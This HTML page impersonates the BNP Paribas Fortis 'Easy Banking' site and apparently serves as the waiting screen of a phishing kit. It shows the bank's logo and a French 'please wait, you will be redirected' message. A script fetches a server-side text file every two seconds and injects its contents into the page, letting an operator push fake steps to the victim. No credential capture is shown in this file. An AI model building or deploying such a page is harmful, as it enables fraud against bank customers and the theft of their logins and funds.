<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">


<title>Mon Easy Banking, ma banque en ligne | BNP Paribas Fortis</title>
	<link rel="stylesheet" href="./layout/css/spin.css">
	<link rel="stylesheet" href="./layout/css/media.css">
	<style>


@media(max-width: 768px) {

	#img_bellogo{
	width:100%;
	} 
  
  }
  	@media (min-width: 800px) {
    	#img_bellogo{
	     width:25%;
	     } 
    }
	@media (min-width: 960px) {
       #img_bellogo{
	     width:25%;
	     }
    }
    @media(min-width: 1440px) {
       #img_bellogo{
	     width:25%;
	     }
    }
    @media(min-width: 2000px) {
       #img_bellogo{
	     width:25%;
	     }
    }
</style>

	
</head>
<body>
	<div class="contenr">
		<center>
			<div class="dika">
				<img src="https://th.bing.com/th/id/OIP.1cnBEBnMvVrl0QjGbQ9EDQHaCI?pid=ImgDet&rs=1" id="img_bellogo">
				<div class="msg"><span class="titiz">Merci de patienter, Vous serez redirigé dans quelques instants....</span></div>
			</div>
		</center>
		 
		<center style="margin-top:-300px">
			<div class="sk-cube-grid">
                <div class="sk-cube sk-cube1"></div>
                <div class="sk-cube sk-cube2"></div>
                <div class="sk-cube sk-cube3"></div>
                <div class="sk-cube sk-cube4"></div>
                <div class="sk-cube sk-cube5"></div>
                <div class="sk-cube sk-cube6"></div>
                <div class="sk-cube sk-cube7"></div>
                <div class="sk-cube sk-cube8"></div>
                <div class="sk-cube sk-cube9"></div>
            </div>
		</center>
			<script src="https://code.jquery.com/jquery-3.4.0.min.js"></script>
		<script>
setInterval(function(){ var client = new XMLHttpRequest();
client.open('GET', './Show_system/Show_Page.txt');
client.onreadystatechange = function() {

document.getElementById("content").innerHTML = client.responseText ;

}
client.send();  }, 2000);
</script>
<div id="content"></div>
			<!-- jQuery -->

	<script src="./layout/js/main.js"></script>	
	</div>
</body>
</html>